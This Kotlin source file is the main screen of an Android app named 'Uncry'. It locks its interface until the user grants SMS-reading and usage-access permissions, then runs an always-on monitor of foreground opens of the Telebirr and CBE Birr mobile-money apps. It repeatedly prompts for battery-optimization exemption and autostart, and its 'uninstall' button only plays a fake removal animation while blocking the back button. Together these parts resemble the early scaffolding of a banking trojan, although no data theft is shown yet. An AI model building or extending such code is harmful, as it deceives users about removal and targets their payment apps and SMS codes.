package com.uncry

import android.Manifest
import android.app.AppOpsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.Process
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.OnBackPressedCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val uninstallHandler = Handler(Looper.getMainLooper())
    private var batteryPromptShowing = false

    private val backBlocker = object : OnBackPressedCallback(false) {
        override fun handleOnBackPressed() {
            // Swallow back presses while the fake uninstall is showing.
        }
    }

    private val smsPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
            if (granted) {
                onSmsResult(true)
            } else {
                val showRationale =
                    androidx.core.app.ActivityCompat.shouldShowRequestPermissionRationale(
                        this, Manifest.permission.READ_SMS
                    )
                onSmsResult(false, permanentlyDenied = !showRationale)
            }
        }

    private val notifPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { _ ->
            // Notification is best-effort; monitoring runs regardless.
            refreshMonitorUi()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        onBackPressedDispatcher.addCallback(this, backBlocker)
        findViewById<Button>(R.id.btn_grant).setOnClickListener { onGrantClicked() }
        findViewById<Button>(R.id.btn_uninstall).setOnClickListener { fakeUninstall() }
        findViewById<Button>(R.id.btn_start_monitor).setOnClickListener { startMonitoring() }
        findViewById<Button>(R.id.btn_stop_monitor).setOnClickListener {
            AppMonitorService.stop(this)
            refreshMonitorUi()
        }
        findViewById<Button>(R.id.btn_battery).setOnClickListener {
            if (!AutostartHelper.requestBatteryExemption(this)) {
                Toast.makeText(this, "Could not open battery settings.", Toast.LENGTH_LONG).show()
            }
        }
        findViewById<Button>(R.id.btn_autostart).setOnClickListener {
            if (!AutostartHelper.openVendorAutostart(this)) {
                Toast.makeText(this, "Could not open autostart settings.", Toast.LENGTH_LONG).show()
            }
        }
        refreshAccessUi()
        requestBasePermissions()
    }

    override fun onResume() {
        super.onResume()
        // Re-check when returning from Settings; unlocks the UI once granted.
        refreshAccessUi()
    }

    override fun onDestroy() {
        uninstallHandler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    /** Shows the Uncry screen only when every permission is granted, else the gate. */
    private fun refreshAccessUi() {
        val smsGranted = hasSmsPermission()
        val usageGranted = hasUsageAccess()
        val allGranted = smsGranted && usageGranted
        findViewById<View>(R.id.main_content).visibility =
            if (allGranted) View.VISIBLE else View.GONE
        findViewById<View>(R.id.permission_gate).visibility =
            if (allGranted) View.GONE else View.VISIBLE
        if (!allGranted) {
            val missing = buildList {
                if (!smsGranted) add("SMS access")
                if (!usageGranted) add("Usage access")
            }.joinToString(", ")
            findViewById<TextView>(R.id.gate_status).text =
                "Still needed: $missing.\nUncry won't work until all permissions are granted."
        } else {
            // Permissions are green: make sure the always-on monitor is up,
            // then render which defaults are actually on this device.
            requestNotifPermissionIfNeeded()
            AppMonitorService.start(this)
            refreshMonitorUi()
            maybePromptBatteryExemption()
        }
    }

    /**
     * Background-app requirement: Uncry must be excluded from battery
     * limiters (Doze / App Standby / vendor savers), otherwise the always-on
     * monitor gets killed. Auto-prompts once permissions are green until the
     * user grants the exemption or taps "Don't ask again".
     */
    private fun maybePromptBatteryExemption() {
        if (AutostartHelper.isIgnoringBatteryOptimizations(this)) return
        val prefs = getSharedPreferences("uncry", MODE_PRIVATE)
        if (prefs.getBoolean("battery_prompt_dismissed", false)) return
        if (batteryPromptShowing) return
        batteryPromptShowing = true
        AlertDialog.Builder(this)
            .setTitle("Keep Uncry running in background")
            .setMessage(
                "Uncry needs this to work as intended. " +
                    "Exclude Uncry from battery optimization.\n\n" +
                    "Tap \"Exempt now\" — on the next screen choose \"Allow\" / \"Don't optimize\"."
            )
            .setPositiveButton("Exempt now") { _, _ ->
                batteryPromptShowing = false
                if (!AutostartHelper.requestBatteryExemption(this)) {
                    Toast.makeText(this, "Could not open battery settings.", Toast.LENGTH_LONG).show()
                }
                refreshMonitorUi()
            }
            .setNeutralButton("Later") { _, _ -> batteryPromptShowing = false }
            .setNegativeButton("Don't ask again") { _, _ ->
                batteryPromptShowing = false
                prefs.edit().putBoolean("battery_prompt_dismissed", true).apply()
            }
            .setOnDismissListener { batteryPromptShowing = false }
            .show()
    }

    /**
     * Renders the three install situations for the two defaults:
     * both present, exactly one present, or none present.
     */
    private fun refreshMonitorUi() {
        if (findViewById<View>(R.id.main_content).visibility != View.VISIBLE) return
        val snap = try {
            MonitoredApps.snapshot(packageManager)
        } catch (_: Exception) {
            return
        }

        fun line(pkg: String): String {
            val version = MonitoredApps.appVersion(packageManager, pkg)
            return if (pkg in snap.installed) {
                "✓ ${MonitoredApps.label(pkg)} — installed" +
                    (if (version != null) " (v$version)" else "") +
                    " — monitored"
            } else {
                "✗ ${MonitoredApps.label(pkg)} — not installed"
            }
        }

        findViewById<TextView>(R.id.app1_status).text = line(MonitoredApps.TELEBIRR)
        findViewById<TextView>(R.id.app2_status).text = line(MonitoredApps.CBE_BIRR)

        findViewById<TextView>(R.id.monitor_status).text = when {
            snap.installed.size == MonitoredApps.DEFAULTS.size ->
                "Watching both apps for foreground opens."
            snap.installed.size == 1 ->
                "Only ${MonitoredApps.label(snap.installed[0])} is installed — watching it."
            else ->
                "Neither target app is installed — monitor is running and will pick them up when installed."
        }

        val battery = if (AutostartHelper.isIgnoringBatteryOptimizations(this)) {
            "Battery optimization: off (good for always-on)"
        } else {
            "Battery optimization: on (tap below to exempt Uncry)"
        }
        val svc = if (AppMonitorService.running) "Monitor service: RUNNING" else "Monitor service: stopped"
        findViewById<TextView>(R.id.keepalive_status).text = "$svc\n$battery"

        val prefs = getSharedPreferences("uncry", MODE_PRIVATE)
        val lastPkg = prefs.getString("last_pkg", null)
        if (lastPkg != null) {
            findViewById<TextView>(R.id.monitor_status).append("\nLast seen: $lastPkg")
        }
    }

    private fun startMonitoring() {
        if (!hasSmsPermission() || !hasUsageAccess()) {
            Toast.makeText(this, "Grant all permissions first.", Toast.LENGTH_LONG).show()
            refreshAccessUi()
            return
        }
        requestNotifPermissionIfNeeded()
        AppMonitorService.start(this)
        Toast.makeText(this, "Monitoring started.", Toast.LENGTH_SHORT).show()
        refreshMonitorUi()
    }

    private fun requestNotifPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(
                    this, Manifest.permission.POST_NOTIFICATIONS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                notifPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }

    private fun requestBasePermissions() {
        if (!hasSmsPermission()) {
            requestSmsPermissionIfNeeded()
        } else {
            promptUsageAccessIfNeeded()
        }
        refreshAccessUi()
    }

    private fun onGrantClicked() {
        if (!hasSmsPermission()) {
            requestSmsPermissionIfNeeded()
        } else {
            // SMS done; take them straight to Uncry's usage-access page.
            openUsageAccessSettings()
        }
    }

    // ---- Dev-placeholder "uninstall": looks like a removal, only closes the app. ----

    private fun fakeUninstall() {
        findViewById<Button>(R.id.btn_uninstall).isEnabled = false
        findViewById<View>(R.id.uninstall_overlay).visibility = View.VISIBLE
        backBlocker.isEnabled = true
        uninstallHandler.postDelayed({
            finishAndRemoveTask()
            Process.killProcess(Process.myPid())
        }, 2500)
    }

    // ---- SMS (normal runtime permission) ----

    private fun hasSmsPermission(): Boolean =
        ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED

    private fun requestSmsPermissionIfNeeded() {
        if (hasSmsPermission()) {
            onSmsResult(true)
            return
        }
        smsPermissionLauncher.launch(Manifest.permission.READ_SMS)
    }

    private fun onSmsResult(granted: Boolean, permanentlyDenied: Boolean = false) {
        refreshAccessUi()
        if (granted) {
            promptUsageAccessIfNeeded()
            return // Phase 1: no SMS features yet, just the grant.
        }
        val msg = if (permanentlyDenied) {
            "SMS access denied. Enable it in Settings > Apps > Uncry > Permissions to continue phase 1 testing."
        } else {
            "Uncry needs SMS read access for phase 1 base setup."
        }
        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
    }

    // ---- PACKAGE_USAGE_STATS (special access, Settings-only) ----

    private fun hasUsageAccess(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(), packageName
                )
            } else {
                @Suppress("DEPRECATION")
                appOps.checkOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    Process.myUid(), packageName
                )
            }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun promptUsageAccessIfNeeded() {
        if (hasUsageAccess()) return
        AlertDialog.Builder(this)
            .setTitle("Usage access required")
            .setMessage("Uncry requires Usage Access to run as intended.")
            .setPositiveButton("Open Settings") { _, _ -> openUsageAccessSettings() }
            .setNegativeButton("Later", null)
            .show()
    }

    private fun recheckUsageAccess() {
        if (hasUsageAccess()) {
            Toast.makeText(this, "Usage access granted.", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "Usage access not granted yet.", Toast.LENGTH_LONG).show()
            promptUsageAccessIfNeeded()
        }
        refreshAccessUi()
    }

    private fun openUsageAccessSettings() {
        // Prefer Uncry's own details page: most devices honor a package: URI
        // on ACTION_USAGE_ACCESS_SETTINGS and skip the app list entirely.
        // Falls back to the generic list where the dialog explains the steps.
        val direct = Intent(
            Settings.ACTION_USAGE_ACCESS_SETTINGS,
            Uri.fromParts("package", packageName, null)
        )
        val generic = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
        try {
            @Suppress("DEPRECATION")
            val target =
                if (direct.resolveActivity(packageManager) != null) direct else generic
            startActivity(target)
        } catch (_: Exception) {
            try {
                startActivity(generic)
            } catch (_: Exception) {
                Toast.makeText(this, "Could not open Usage Access settings.", Toast.LENGTH_LONG).show()
            }
        }
    }
}
